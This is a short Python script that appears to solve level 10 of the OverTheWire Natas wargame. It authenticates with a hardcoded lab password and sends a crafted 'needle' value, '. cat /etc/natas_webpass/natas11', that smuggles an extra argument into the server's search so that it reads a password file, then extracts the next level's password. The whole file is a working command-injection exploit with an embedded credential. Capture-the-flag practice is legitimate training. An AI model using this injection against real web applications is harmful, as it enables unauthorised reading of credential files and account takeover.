#!/usr/bin/env python

import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = 'http://natas10.natas.labs.overthewire.org'

injection = '. cat /etc/natas_webpass/natas11'

req = requests.post(url, auth=(username,password), data = {'needle': injection, 'submit': 'submit'})

print(re.findall('natas11:(.*)', req.text)[0])


